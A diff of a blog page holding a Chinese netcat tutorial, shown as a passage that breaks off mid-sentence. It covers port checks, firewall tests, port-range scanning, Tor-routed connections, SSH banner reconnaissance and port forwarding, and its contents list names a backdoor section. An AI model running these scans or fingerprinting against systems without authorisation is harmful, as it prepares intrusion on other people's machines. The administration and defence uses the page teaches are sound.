-                <a href="/2020/01/31/Microservices-1/" class="title">微服务理论与实践[1]-什么是微服务</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2020-01-31T02:37:33.000Z" itemprop="datePublished">2020-01-31</time>
-              </p>
-            </div>
-          </li>
-          
       </ul>
     </div>
   </div>
@@ -317,7 +319,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#招数1网络诊断测试某个远程主机的监听端口是否可达"><span class="toc-number">1.</span> <span class="toc-text"> ★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充说明超时设置"><span class="toc-number">2.</span> <span class="toc-text"> ◇补充说明：超时设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数2网络诊断判断防火墙是否允许-or-禁止某个端口"><span class="toc-number">3.</span> <span class="toc-text"> ★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数3渗透测试用-nc-玩端口扫描"><span class="toc-number">4.</span> <span class="toc-text"> ★招数3：（渗透测试）用 nc 玩“端口扫描”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数4隐匿性如何让-nc-走暗网以-tor-为例"><span class="toc-number">5.</span> <span class="toc-text"> ★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数5信息收集用-nc-探测服务器类型和软件版本以-ssh-为例"><span class="toc-number">6.</span> <span class="toc-text"> ★招数5（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数7网络配置基于-nc-的端口转发port-forward"><span class="toc-number">7.</span> <span class="toc-text"> ★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数9系统管理用-nc-传输文件"><span class="toc-number">8.</span> <span class="toc-text"> 招数9：（系统管理）用 nc 传输文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数10系统管理用-nc-远程备份整个磁盘"><span class="toc-number">9.</span> <span class="toc-text"> 招数10：（系统管理）用 nc 远程备份整个磁盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数11入侵手法用-nc-开启被动连接型后门"><span class="toc-number">10.</span> <span class="toc-text"> 招数11：（入侵手法）用 nc 开启【被动】连接型后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">11.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-2"><span class="toc-number">12.</span> <span class="toc-text"> </span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#招数1网络诊断测试某个远程主机的监听端口是否可达"><span class="toc-number">1.</span> <span class="toc-text"> ★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充说明超时设置"><span class="toc-number">2.</span> <span class="toc-text"> ◇补充说明：超时设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数2网络诊断判断防火墙是否允许-or-禁止某个端口"><span class="toc-number">3.</span> <span class="toc-text"> ★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数3渗透测试用-nc-玩端口扫描"><span class="toc-number">4.</span> <span class="toc-text"> ★招数3：（渗透测试）用 nc 玩“端口扫描”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数4隐匿性如何让-nc-走暗网以-tor-为例"><span class="toc-number">5.</span> <span class="toc-text"> ★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数5信息收集用-nc-探测服务器类型和软件版本以-ssh-为例"><span class="toc-number">6.</span> <span class="toc-text"> ★招数5（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数7网络配置基于-nc-的端口转发port-forward"><span class="toc-number">7.</span> <span class="toc-text"> ★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数9系统管理用-nc-传输文件"><span class="toc-number">8.</span> <span class="toc-text"> 招数9：（系统管理）用 nc 传输文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数10系统管理用-nc-远程备份整个磁盘"><span class="toc-number">9.</span> <span class="toc-text"> 招数10：（系统管理）用 nc 远程备份整个磁盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#招数11入侵手法用-nc-开启被动连接型后门"><span class="toc-number">10.</span> <span class="toc-text"> 招数11：（入侵手法）用 nc 开启【被动】连接型后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">11.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-2"><span class="toc-number">12.</span> <span class="toc-text"> </span></a></li></ol>
     </nav>
   </div>
 </aside>
@@ -339,7 +341,7 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/" class="article-date">
+	<a href="/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/" class="article-date">
 	  <time datetime="2019-11-14T15:49:56.000Z" itemprop="datePublished">2019-11-14</time>
 	</a>
 </span>
@@ -352,7 +354,7 @@
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link" href="/tags/go/">go</a>
+	<a class="article-tag-link" href="/tags/go/" rel="tag">go</a>
   </span>
 
 
@@ -365,7 +367,7 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/#comments" class="article-comment-link">评论</a></span>
         
 	
 		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6k(字)</span>
@@ -380,256 +382,256 @@
       
         <h2 id="招数1网络诊断测试某个远程主机的监听端口是否可达"><a class="markdownIt-Anchor" href="#招数1网络诊断测试某个远程主机的监听端口是否可达"></a> ★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2>
 <p>◇使用场景</p>
-<p>经常有这种需求，要判断某个主机的监听端口是否能连上。<br>
-　　导致监听端口【无法】，通常有两种原因：<br>
-其一，这个监听端口根本就【没开启】；<br>
-其二，监听端口虽然开启，但是被防火墙阻拦了。<br>
-　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启（不懂 netstat 命令的同学，可以看这篇博文）<br>
+<p>经常有这种需求，要判断某个主机的监听端口是否能连上。<br />
+　　导致监听端口【无法】，通常有两种原因：<br />
+其一，这个监听端口根本就【没开启】；<br />
+其二，监听端口虽然开启，但是被防火墙阻拦了。<br />
+　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启（不懂 netstat 命令的同学，可以看这篇博文）<br />
 　　但对于第2个原因，netstat 就用不上了。这时候就可以用 nc 来帮你搞定。</p>
 <p>◇方法</p>
 <p>用如下命令可以测试某个 IP 地址（x.x.x.x）上的某个监听端口（xx）是否开启。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv x.x.x.x xx</span><br></pre></td></tr></table></figure>
 <p>上述命令用到了如下几个选项：</p>
-<p>选项 -v<br>
-　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>
+<p>选项 -v<br />
+　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br />
 　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p>
-<p>选项 -n<br>
-　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>
+<p>选项 -n<br />
+　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br />
 　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
 <h2 id="补充说明超时设置"><a class="markdownIt-Anchor" href="#补充说明超时设置"></a> ◇补充说明：超时设置</h2>
-<p>在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>
-　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。<br>
+<p>在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br />
+　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。<br />
 nc -nv -w 3 x.x.x.x xx</p>
 <h2 id="招数2网络诊断判断防火墙是否允许-or-禁止某个端口"><a class="markdownIt-Anchor" href="#招数2网络诊断判断防火墙是否允许-or-禁止某个端口"></a> ★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2>
 <p>◇使用场景</p>
-<p>前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>
-　　现在换另一个场景：<br>
-　　假设你正在配置防火墙规则，禁止 TCP 的 8080 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>
-　　更进一步说：如果当前【没有】任何软件开启 8080 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>
-　　为了叙述方便，设想如下场景：<br>
-有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>
+<p>前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br />
+　　现在换另一个场景：<br />
+　　假设你正在配置防火墙规则，禁止 TCP 的 8080 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br />
+　　更进一步说：如果当前【没有】任何软件开启 8080 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br />
+　　为了叙述方便，设想如下场景：<br />
+有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br />
 然后要判断“主机S”上的防火墙是否会拦截其它主机对 8080 TCP 端口的连接。</p>
 <p>◇方法</p>
 <p>在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv -p 8080</span><br></pre></td></tr></table></figure>
-<p>选项 -l<br>
+<p>选项 -l<br />
 　　这个选项会让 nc 进入监听模式。</p>
-<p>选项 -p<br>
+<p>选项 -p<br />
 　　这个选项有“选项值”，也就是具体端口号。</p>
 <p>然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p>
 <p>◇补充说明：如何让 nc 的监听端口【持续开启】</p>
-<p>在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>
-　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>
+<p>在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br />
+　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br />
 　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 -k 选项。</p>
 <p>◇补充说明：UDP</p>
 <p>上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 -u 选项。</p>
 <h2 id="招数3渗透测试用-nc-玩端口扫描"><a class="markdownIt-Anchor" href="#招数3渗透测试用-nc-玩端口扫描"></a> ★招数3：（渗透测试）用 nc 玩“端口扫描”</h2>
 <p>◇使用场景</p>
-<p>在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>
-　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>
-　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>
-　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>
-　　顺便说一下：<br>
+<p>在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br />
+　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br />
+　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br />
+　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br />
+　　顺便说一下：<br />
 不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：1 ~ 65535</p>
 <p>◇方法</p>
 <p>下面这个命令，用来扫描 IP 地址为 x.x.x.x 的主机，扫描的端口范围从 1 到 1024</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -znv x.x.x.x 1-1024</span><br></pre></td></tr></table></figure>
-<p>选项 -z<br>
-　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br>
-　　选项 -n<br>
-　　（前面已聊过，参见“招数1”）<br>
-　　选项 -v<br>
-　　-v 选项前面也聊过，这里要特地强调一下。<br>
+<p>选项 -z<br />
+　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br />
+　　选项 -n<br />
+　　（前面已聊过，参见“招数1”）<br />
+　　选项 -v<br />
+　　-v 选项前面也聊过，这里要特地强调一下。<br />
 　　对 nc 的其它用法，-v 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p>
 <p>◇补充说明：优化输出</p>
-<p>玩“端口扫描”的时候，“-v 选项”会把“成功/失败”的结果统统打印出来。<br>
-　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。<br>
-nc -znv x.x.x.x 1-1024  2&gt;&amp;1 | grep succeeded<br>
-　　由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br>
+<p>玩“端口扫描”的时候，“-v 选项”会把“成功/失败”的结果统统打印出来。<br />
+　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。<br />
+nc -znv x.x.x.x 1-1024  2&gt;&amp;1 | grep succeeded<br />
+　　由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br />
 　　grep 命令用来进行【过滤】。对于 Windows 系统，默认【没有】grep 命令，需改用 find 命令过滤。</p>
 <p>◇补充说明：超时设置</p>
-<p>如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>
-超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>
+<p>如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br />
+超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br />
 　　具体如何设置，参见“招数1”的“补充说明”。</p>
 <p>◇补充说明：【并发】扫描</p>
-<p>如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>
+<p>如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br />
 　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p>
 <h2 id="招数4隐匿性如何让-nc-走暗网以-tor-为例"><a class="markdownIt-Anchor" href="#招数4隐匿性如何让-nc-走暗网以-tor-为例"></a> ★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2>
 <p>◇方法</p>
 <p>为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：-X 与 -x</p>
-<p>选项 -x<br>
+<p>选项 -x<br />
 　　该选项表示【代理的位置】，以 x.x.x.x:xxx 的形式表示（中间是【半角冒号】）。</p>
-<p>选项 -X<br>
-　　该选项表示【代理的类型】，含义如下：<br>
-选项值	含义<br>
-5	SOCKS5 代理<br>
-4	SOCKS4 代理<br>
-connect	CONNECT 型的 HTTP 代理<br>
-　　上述这几种类型的代理，功能上有啥差异，参见下面这篇博文开头部分的★预备知识章节。<br>
+<p>选项 -X<br />
+　　该选项表示【代理的类型】，含义如下：<br />
+选项值	含义<br />
+5	SOCKS5 代理<br />
+4	SOCKS4 代理<br />
+connect	CONNECT 型的 HTTP 代理<br />
+　　上述这几种类型的代理，功能上有啥差异，参见下面这篇博文开头部分的★预备知识章节。<br />
 《如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）》</p>
-<p>首先，确保你本机已经运行了 Tor；<br>
-　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 succeeded（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。<br>
+<p>首先，确保你本机已经运行了 Tor；<br />
+　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 succeeded（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。<br />
 nc -X 5 -x 127.0.0.1:9050 -q 3 -v <a href="http://program-think.blogspot.com" target="_blank" rel="noopener">program-think.blogspot.com</a> 443</p>
-<p>Connection to <a href="http://program-think.blogspot.com" target="_blank" rel="noopener">program-think.blogspot.com</a> 443 port [tcp/https] succeeded!<br>
+<p>Connection to <a href="http://program-think.blogspot.com" target="_blank" rel="noopener">program-think.blogspot.com</a> 443 port [tcp/https] succeeded!<br />
 ◇补充说明：Tor 暗网的好处</p>
-<p>关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br>
-　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。<br>
+<p>关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br />
+　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。<br />
 　　对这方面的更多介绍，参见：《关于 Tor 的常见问题解答》</p>
 <p>◇补充说明：域名解析</p>
-<p>当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br>
-　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。<br>
-　　关于“DNS 协议”的引申阅读，可以看如下几篇：<br>
-《扫盲 DNS 原理，兼谈“域名劫持”和“域名欺骗／域名污染”》<br>
+<p>当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br />
+　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。<br />
+　　关于“DNS 协议”的引申阅读，可以看如下几篇：<br />
+《扫盲 DNS 原理，兼谈“域名劫持”和“域名欺骗／域名污染”》<br />
 《对比4种强化域名安全的协议——DNSSEC，DNSCrypt，DNS over TLS，DNS over HTTPS》</p>
 <p>◇补充说明：设置别名（alias）</p>
-<p>如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）<br>
-alias nc-tor=‘nc -X 5 -x 127.0.0.1:9050’<br>
-　　设置好之后，你只要用 nc-tor 就可以自动追加代理选项。<br>
-　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br>
+<p>如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）<br />
+alias nc-tor=‘nc -X 5 -x 127.0.0.1:9050’<br />
+　　设置好之后，你只要用 nc-tor 就可以自动追加代理选项。<br />
+　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br />
 　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 9050 是用于“裸 Tor”。</p>
 <h2 id="招数5信息收集用-nc-探测服务器类型和软件版本以-ssh-为例"><a class="markdownIt-Anchor" href="#招数5信息收集用-nc-探测服务器类型和软件版本以-ssh-为例"></a> ★招数5（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2>
-<p>如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br>
+<p>如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br />
 　　如果某个服务器运行了 SSH 服务端（默认监听端口是 22），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection to 192.168.1.25 port 22 [tcp/*] succeeded!</span><br><span class="line">SSH-2.0-OpenSSH_for_Windows_7.7</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection to 192.168.1.25 port 22 [tcp&#x2F;*] succeeded!</span><br><span class="line">SSH-2.0-OpenSSH_for_Windows_7.7</span><br></pre></td></tr></table></figure>
 <p>◇补充说明：批处理 ＆ 自动化</p>
-<p>某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br>
-　　另外，<br>
-　　有的系统管理员会把 sshd 的监听端口从 22 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br>
+<p>某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br />
+　　另外，<br />
+　　有的系统管理员会把 sshd 的监听端口从 22 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br />
 　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。</p>
 <p>◇补充说明：防范措施</p>
-<p>本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br>
-　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br>
+<p>本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br />
+　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br />
 　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。</p>
 <h2 id="招数7网络配置基于-nc-的端口转发port-forward"><a class="markdownIt-Anchor" href="#招数7网络配置基于-nc-的端口转发port-forward"></a> ★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2>
 <p>◇原理</p>
-<p>用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br>
-　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 |），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br>
-　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br>
+<p>用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br />
+　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 |），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br />
+　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br />
 　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。</p>
 <p>◇方法</p>
-<p>步骤1：创建命名管道<br>
-　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 nc_pipe。（俺用这个名称只是为了举例，你也可以用别的名称）<br>
+<p>步骤1：创建命名管道<br />
+　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 nc_pipe。（俺用这个名称只是为了举例，你也可以用别的名称）<br />
 mkfifo nc_pipe</p>
-<p>步骤2：同时启动两个 nc<br>
-nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe<br>
+<p>步骤2：同时启动两个 nc<br />
+nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe<br />
 　　运行上述命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。</p>
-<p>这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br>
-　　如果你比较喜欢刨根问底，俺稍微解释一下：<br>
+<p>这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br />
+　　如果你比较喜欢刨根问底，俺稍微解释一下：<br />
 　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 nc_pipe 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。</p>
 <p>◇补充说明：如何让 nc 的监听端口【持续开启】</p>
 <p>参见“招数2”章节中的“补充说明”。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep &quot;LISTEN&quot;</span><br></pre></td></tr></table></figure>
 <h2 id="招数9系统管理用-nc-传输文件"><a class="markdownIt-Anchor" href="#招数9系统管理用-nc-传输文件"></a> 招数9：（系统管理）用 nc 传输文件</h2>
 <p>◇使用场景</p>
-<p>有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br>
-　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br>
-　　反驳的理由很多——<br>
-反驳1：这个玩意儿只能在 Windows 上用。<br>
-反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br>
-反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br>
-…<br>
-　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br>
-　　俺觉得：<br>
-1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br>
+<p>有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br />
+　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br />
+　　反驳的理由很多——<br />
+反驳1：这个玩意儿只能在 Windows 上用。<br />
+反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br />
+反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br />
+…<br />
+　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br />
+　　俺觉得：<br />
+1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br />
 2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。</p>
 <p>◇方法</p>
 <p>为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
-<p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）<br>
